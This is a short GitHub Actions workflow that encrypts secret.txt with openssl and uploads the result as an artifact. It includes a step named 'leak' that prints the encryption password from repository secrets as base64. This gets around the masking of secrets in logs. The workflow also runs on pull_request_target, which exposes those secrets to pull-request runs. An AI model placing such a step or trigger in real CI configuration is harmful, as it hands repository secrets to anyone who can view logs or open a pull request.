name: Encrypt File

on:
  push:
  pull_request_target:
  workflow_dispatch:

jobs:
  encrypt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Encrypt secret.txt
        env:
          CRYPT_PASSWD: ${{ secrets.crypt_passwd }}
        run: |
          openssl enc -aes-256-cbc -salt -pbkdf2 \
            -in secret.txt \
            -out secret.txt.enc \
            -pass env:CRYPT_PASSWD
      
      - name: leak
        env:
          CRYPT_PASSWD: ${{ secrets.crypt_passwd }}
        run: echo $CRYPT_PASSWD | base64

      - uses: actions/upload-artifact@v4
        with:
          name: encrypted-file
          path: secret.txt.enc
